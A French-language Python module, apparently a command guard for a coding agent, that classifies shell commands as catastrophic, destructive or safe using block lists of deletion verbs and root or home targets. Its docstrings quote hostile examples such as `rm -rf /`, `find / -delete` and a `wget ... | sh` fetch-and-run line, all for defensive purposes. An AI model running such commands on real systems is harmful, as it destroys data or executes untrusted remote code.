"""Ce qu'une commande shell a le droit de faire sans qu'on demande.

Trois verdicts : `est_catastrophique` (refus absolu), `est_destructive`
(confirmation), `est_connue_sure` (exécution directe). Ce qui n'est ni l'un ni
l'autre demande une confirmation — le défaut est fermé.

La détection repère le mot en POSITION DE COMMANDE dans chaque segment :
séparateurs découpés, affectations et enveloppes (`sudo`, `nohup`…) retirées,
chemins absolus réduits au basename, `bash -c`, `$(…)` et `ssh hôte` ouverts.

Sur-détecter coûte un clic, sous-détecter coûte des données : le filet est
volontairement large.

LIMITE : `python3 -c "shutil.rmtree('/')"` ne contient aucun verbe shell, et
aucune détection par motif ne peut le voir. Ce module protège des accidents, pas
d'un adversaire — pour cela, il faut un bac à sable.
"""
from __future__ import annotations

import re
from pathlib import PurePosixPath, PureWindowsPath

#: Verbes destructeurs, toutes familles d'OS. L'union plutôt que le choix selon
#: l'OS détecté : une détection qui se trompe désarmerait le garde, alors qu'un
#: `del /f` vu sous Linux ne coûte qu'une confirmation de trop.
VERBES_DESTRUCTEURS: frozenset[str] = frozenset({
    # POSIX
    "rm", "rmdir", "shred", "mkfs", "dd", "truncate", "unlink", "wipefs",
    # PowerShell
    "remove-item", "ri", "rmo", "clear-disk", "format-volume", "clear-content",
    # cmd.exe
    "del", "erase", "rd", "format", "diskpart", "takeown", "icacls", "cipher",
})

#: Sous-commandes destructrices d'outils par ailleurs anodins. La casse des
#: arguments compte : `git branch -d` et `-D` ne font pas la même chose.
SOUS_COMMANDES_DESTRUCTRICES: dict[str, tuple[tuple[str, ...], ...]] = {
    "git":     (("clean",), ("reset", "--hard"), ("push", "--force"),
                ("push", "-f"), ("branch", "-D"), ("checkout", "--force")),
    "pip":     (("uninstall",),),
    "pip3":    (("uninstall",),),
    "npm":     (("uninstall",), ("unpublish",)),
    "pnpm":    (("uninstall",), ("remove",)),
    "yarn":    (("remove",),),
    "pacman":  (("-R",), ("-Rns",), ("-Rs",), ("-Rdd",), ("-Scc",)),
    "yay":     (("-R",), ("-Rns",), ("-Rs",), ("-Scc",)),
    "apt":     (("remove",), ("purge",), ("autoremove",)),
    "apt-get": (("remove",), ("purge",), ("autoremove",)),
    "dnf":     (("remove",), ("erase",)),
    "zypper":  (("remove",), ("rm",)),
    "apk":     (("del",),),
    "brew":    (("uninstall",), ("remove",)),
    "winget":  (("uninstall",),),
    "docker":  (("system", "prune"), ("volume", "rm"), ("rmi",)),
    "kubectl": (("delete",),),
}

#: Options qui rendent destructrice une commande qui ne l'est pas. `find` seul
#: lit ; `find -delete` efface.
OPTIONS_DESTRUCTRICES: dict[str, tuple[str, ...]] = {
    "find":  ("-delete", "-exec"),
    "rsync": ("--delete", "--delete-after", "--delete-before"),
}

#: Enveloppes : effacées devant la commande qu'elles portent. Liste finie par
#: nature — ce qu'elle rate devient une confirmation, pas une exécution.
_ENVELOPPES: frozenset[str] = frozenset({
    "sudo", "doas", "nohup", "time", "env", "command", "exec", "nice",
    "ionice", "timeout", "stdbuf", "setsid", "xargs", "watch", "script",
})

#: Enveloppes portant leur charge dans un argument, pas en position suivante.
_ENVELOPPES_INLINE: frozenset[str] = frozenset({
    "bash", "sh", "zsh", "dash", "ksh", "fish", "eval", "source", ".",
    "powershell", "pwsh", "cmd",
})

#: Ce qui s'exécute sans confirmation. Tout le reste en demande une.
#:
#: Compromis assumé, pas une garantie : `pytest`, `npm` et `python script.py`
#: exécutent du code arbitraire. Les exiger en confirmation rendrait l'agent
#: inutilisable pour ce qu'il fait le plus.
SANS_CONFIRMATION: frozenset[str] = frozenset({
    # Lire et inspecter
    "ls", "ll", "dir", "cat", "bat", "head", "tail", "less", "more", "wc",
    "grep", "rg", "egrep", "fgrep", "find", "fd", "locate", "file", "stat",
    "du", "df", "tree", "realpath", "readlink", "basename", "dirname",
    "diff", "cmp", "md5sum", "sha256sum", "sort", "uniq", "cut", "awk",
    "sed", "tr", "column", "jq", "yq", "xxd", "strings",
    # Créer sans jamais détruire. `mkdir` ne peut rien écraser, et `touch` ne
    # change qu'une date sur un fichier existant. Vécu : « crée un fichier x.py »
    # ouvrait un questionnaire « commande non reconnue comme sûre » sur un
    # `mkdir -p` — le frottement exact qui fait désactiver un garde.
    "mkdir", "touch", "mktemp",
    # Contexte
    "pwd", "cd", "echo", "printf", "date", "whoami", "hostname", "uname",
    "which", "type", "whereis", "printenv", "id", "groups", "uptime",
    "ps", "top", "htop", "free", "lsof", "netstat", "ss", "ping",
    # Développement
    "git", "python", "python3", "node", "deno", "bun", "npm", "pnpm", "yarn",
    "npx", "pytest", "tox", "ruff", "mypy", "black", "eslint", "prettier",
    "make", "cargo", "go", "javac", "java", "mvn", "gradle", "php", "composer",
    "tsc", "vite", "webpack", "docker", "kubectl", "terraform",
    # Réseau en lecture
    "curl", "wget", "http", "ssh", "scp", "rsync", "gh", "aws",
})

#: Interpréteurs acceptant du code en ligne. Le binaire est sur la liste
#: blanche, mais `python3 -c "…"` porte du code illisible pour un motif shell :
#: on ne le déclare donc pas sûr.
_INTERPRETEURS = frozenset({"python", "python3", "perl", "ruby", "node", "deno",
                            "bun", "php", "bash", "sh", "zsh", "powershell", "pwsh"})
_CODE_EN_LIGNE = frozenset({"-c", "-e", "-E", "--eval", "-Command", "--command"})

_SEPARATEURS = re.compile(r"[;&|\n]+")
_AFFECTATION = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


def _mot_de_commande(segment: str) -> tuple[str, list[str]]:
    """(verbe, arguments) d'un segment, ou ("", []) s'il n'en porte aucun."""
    jetons = segment.split()
    while jetons:
        jeton = jetons[0]
        # Affectation en tête : `X=1 rm -rf y`.
        if _AFFECTATION.match(jeton):
            jetons = jetons[1:]
            continue
        nu = _basename(jeton).lower()
        if nu in _ENVELOPPES:
            jetons = jetons[1:]
            # Les options de l'enveloppe et son éventuel argument numérique
            # (`timeout 30`, `nice -n 5`) ne sont pas la commande portée.
            while jetons and (jetons[0].startswith("-") or jetons[0].isdigit()):
                jetons = jetons[1:]
            continue
        return nu, jetons[1:]
    return "", []


def _basename(jeton: str) -> str:
    """`/bin/rm` → `rm`, `C:\\Windows\\del.exe` → `del`."""
    nu = jeton.strip().strip('"\'')
    nu = PurePosixPath(nu).name if "/" in nu else nu
    nu = PureWindowsPath(nu).name if "\\" in nu else nu
    return nu[:-4] if nu.lower().endswith(".exe") else nu


def _demasquer(commande: str) -> list[str]:
    """La commande, plus le contenu de ses `$(…)`, `bash -c` et `ssh hôte`.

    Ces formes portent leur charge dans une chaîne : sans les ouvrir, le verbe
    vu serait l'enveloppe.
    """
    morceaux = [commande]
    for trouve in _SUBSTITUTION.finditer(commande):
        interne = trouve.group(1) or trouve.group(2) or ""
        if interne.strip():
            morceaux.append(interne)
    for segment in _SEPARATEURS.split(commande):
        jetons = segment.split()
        if not jetons:
            continue
        # La charge est derrière l'hôte : sans l'ouvrir, le verbe vu est `ssh`,
        # qui est sur la liste blanche.
        if _basename(jetons[0]).lower() in ("ssh", "doas-ssh"):
            reste = jetons[1:]
            while reste and reste[0].startswith("-"):
                # Les options à valeur (-i, -p, -o, -F, -l) mangent leur argument.
                mange = reste[0] in ("-i", "-p", "-o", "-F", "-l", "-J", "-b", "-c")
                reste = reste[2:] if (mange and len(reste) > 1) else reste[1:]
            if len(reste) > 1:      # un hôte SEUL est une session interactive
                morceaux.append(" ".join(reste[1:]).strip('"\''))
            continue
        if _basename(jetons[0]).lower() in _ENVELOPPES_INLINE:
            # Ce qui suit `-c` / `-Command`, guillemets retirés.
            for i, jeton in enumerate(jetons[1:], start=1):
                if jeton.lower() in ("-c", "-command", "/c") and i + 1 < len(jetons):
                    morceaux.append(" ".join(jetons[i + 1:]).strip('"\''))
                    break
            else:
                reste = " ".join(jetons[1:]).strip('"\'')
                if reste:
                    morceaux.append(reste)
    return morceaux


def verbes_de(commande: str) -> list[tuple[str, list[str]]]:
    """Tous les (verbe, arguments) en position de commande."""
    trouves: list[tuple[str, list[str]]] = []
    for morceau in _demasquer(commande):
        for segment in _SEPARATEURS.split(morceau):
            verbe, args = _mot_de_commande(segment)
            if verbe:
                trouves.append((verbe, args))
    return trouves


def _est_destructeur(verbe: str, args: list[str]) -> bool:
    if verbe in VERBES_DESTRUCTEURS:
        return True
    # `mkfs.ext4`, `mkfs.xfs`, `mkfs.vfat` : le préfixe suffit et ne recouvre
    # rien d'autre.
    if verbe.startswith("mkfs."):
        return True
    # Casse signifiante : `git branch -d` supprime une branche fusionnée, `-D`
    # l'impose.
    for sequence in SOUS_COMMANDES_DESTRUCTRICES.get(verbe, ()):
        if all(mot in args for mot in sequence):
            return True
    return any(o in args for o in OPTIONS_DESTRUCTRICES.get(verbe, ()))


def est_destructive(commande: str) -> bool:
    """Un verbe destructeur occupe une position de commande."""
    return any(_est_destructeur(v, a) for v, a in verbes_de(commande))


def est_connue_sure(commande: str) -> bool:
    """Tous les verbes sont sur la liste blanche, sans option destructrice.

    Tous, et pas le premier : `ls && wget http://x | sh` ne devient pas
    inoffensif parce qu'il commence par `ls`.
    """
    verbes = verbes_de(commande)
    if not verbes:
        return False
    return all(v in SANS_CONFIRMATION
               and not _est_destructeur(v, a)
               and not (v in _INTERPRETEURS and _CODE_EN_LIGNE & set(a))
               for v, a in verbes)


#: Cibles dont la suppression détruit le système ou le travail en cours.
CIBLES_CATASTROPHIQUES: frozenset[str] = frozenset({
    ".", "..", "/", "~", "*", "$home", "${home}", "$pwd", "${pwd}",
    "c:", "d:", "%userprofile%", "%homepath%", "%systemroot%",
    "$env:userprofile", "$env:homepath", "$env:systemroot", "*.*", "/*", "~/*",
})

#: Les verbes qui suppriment, parmi les destructeurs. `dd` et `mkfs` détruisent
#: aussi, mais leur cible ne se lit pas de la même façon.
_VERBES_SUPPRESSION = frozenset({
    "rm", "rmdir", "remove-item", "ri", "del", "erase", "rd", "shred", "unlink",
})


def est_catastrophique(commande: str) -> bool:
    """Suppression visant la racine, le home, le dossier courant ou un joker.

    Refusée même avec confirmation : aucun « oui » ne rend `rm -rf /` acceptable.
    """
    for verbe, args in verbes_de(commande):
        cibles = [a for a in args if not a.startswith("-")]
        if verbe in _VERBES_SUPPRESSION:
            if any(_cible_catastrophique(c) for c in cibles):
                return True
        # `find / -delete` ne nomme pas sa cible en dernier mais en premier :
        # c'est le point de départ du parcours, et tout ce qu'il trouve y passe.
        elif verbe == "find" and {"-delete", "-exec"} & set(args) and cibles:
            if _cible_catastrophique(cibles[0]):
                return True
    return False


def _cible_catastrophique(argument: str) -> bool:
    nu = argument.strip().strip('"\'').lower()
    nu = nu.removeprefix("filesystem::")
    if nu in CIBLES_CATASTROPHIQUES:
        return True
    # `/`, `/*`, `~/`, `~/*` une fois la barre finale retirée.
    sans_barre = nu.rstrip("/").rstrip("\\")
    return (sans_barre or "/") in CIBLES_CATASTROPHIQUES
